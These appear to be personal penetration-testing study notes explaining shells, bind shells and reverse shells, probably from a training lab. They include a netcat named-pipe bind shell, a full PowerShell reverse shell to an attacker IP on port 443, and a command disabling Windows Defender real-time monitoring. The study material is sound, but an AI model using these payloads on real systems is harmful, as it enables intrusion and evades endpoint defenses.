A `shell` is a program that provides a computer user with an interface to input instructions into the system and view text output Bash, Zsh, cmd, and PowerShell.
Shell give us direct access to os, system commands and file system that help to get privileges, pivot, transfer files, and more. 

Establishing shell mean we  accessing the `CLI` of  OS, and this can make us harder to notice than if we were remotely accessing a graphical shell over [VNC](https://en.wikipedia.org/wiki/Virtual_Network_Computing) or [RDP](https://www.cloudflare.com/learning/access-management/what-is-the-remote-desktop-protocol/).  `CLI` is that they can be `harder to detect than graphical shells`, `faster to navigate the OS`, and `easier to automate our actions`.

| **Perspective**               | **Description**                                                                                                                                                                                                                                                                                                                                                                                     |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Computing`                   | The text-based userland environment that is utilized to administer tasks and submit instructions on a PC. Think Bash, Zsh, cmd, and PowerShell.                                                                                                                                                                                                                                                     |
| `Exploitation` `&` `Security` | A shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. An example would be triggering [EternalBlue](https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf) on a Windows host to gain access to the cmd-prompt on a host remotely.                                                           |
| `Web`                         | This is a bit different. A web shell is much like a standard shell, except it exploits a vulnerability (often the ability to upload a file or script) that provides the attacker with a way to issue instructions, read and access files, and potentially perform destructive actions to the underlying host. Control of the web shell is often done by calling the script within a browser window. |
# Anatomy of a Shell
Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. 

| **Terminal Emulator**                                          | **Operating System**     |
| :------------------------------------------------------------- | :----------------------- |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app/)                                    | Windows                  |
| [PuTTY](https://www.putty.org/)                                | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org/)                            | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_\(macOS\))   | MacOS                    |
| [iTerm2](https://iterm2.com/)                                  | MacOS                    |
 CLI is a combination of the operating system, terminal emulator application, and the command language interpreter. Many different command language interpreters can be used, some of which are also called `shell scripting languages` or `Command and Scripting interpreters` as defined in the [Execution techniques](https://attack.mitre.org/techniques/T1059/) of the `MITRE ATT&CK Matrix`. 
We open shell command so bash language interpreter did not understand and return command not found and other way to recognize interpreter is running process.
```bash
ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```
we can also check it in environment variable `env`.
```bash
env

SHELL=/bin/bash
```

- **Bash:** Linux native shell, default for Parrot OS.
- **PowerShell:** Cross-platform shell installed to provide Windows-like shell capabilities, useful for pentesting and working with Windows environments.

![[Pasted image 20250808081515.png]]


In some cases we want to establish a connection with system so we looking for terminal emulator application through its shell. This is typically done by using a `Bind` or `Reverse` shell.With a bind shell, the `target` system has a listener started and awaits a connection from attacker.
![[Pasted image 20250808094307.png]]

In this we get connection successfully. In some cases
- Admins typically configure strict incoming firewall rules and NAT, so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

 To get bash shell we run `nc` command and then `bash` command for interactive shell. Send request from attacker machine.
```bash
nc 10.129.201.134 4444
```

Victim listen on port 4444
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f
```

First delete file with name `f` forcefully inside `tmp`.
Make special file name fifo that allow two process to communicate (read and write).
Read the data from file and send input from pipe into **interactive bash shell**.
Here -i make bash act as running in real machine.
Error also sent through file to attacker **stderr (2)** to **stdout (1)**.

If we try bind shell so it can easily be caught by firewall or IDS/IPS. we need to try for reverse shell.

# Reverse Shells
In this target will sent request back to attacker machine.
![[Pasted image 20250809105506.png]]
 [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators. 
Most of time we will use [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) `443` (HTTPs) or any other because teams do not block Https. A firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port.

Most of time `nc` is not avilable on window machine so we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.

Paste this on target machine.
```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.36',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Add listener on attacker machine
```bash
sudo nc -nvlp 443
```

If antivirus on window block script so we this.
```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
```

